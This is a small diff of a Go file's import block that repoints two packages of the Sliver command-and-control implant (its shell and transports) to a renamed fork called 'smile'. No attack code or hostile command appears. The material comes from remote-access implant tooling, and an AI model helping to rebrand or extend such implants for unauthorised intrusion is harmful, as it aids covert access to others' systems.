@@ -26,8 +26,8 @@ import (
 
 	"io"
 
-	"github.com/bishopfox/sliver/implant/sliver/shell"
-	"github.com/bishopfox/sliver/implant/sliver/transports"
+	"github.com/baconpotato519/smile/implant/smile/shell"
+	"github.com/baconpotato519/smile/implant/smile/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
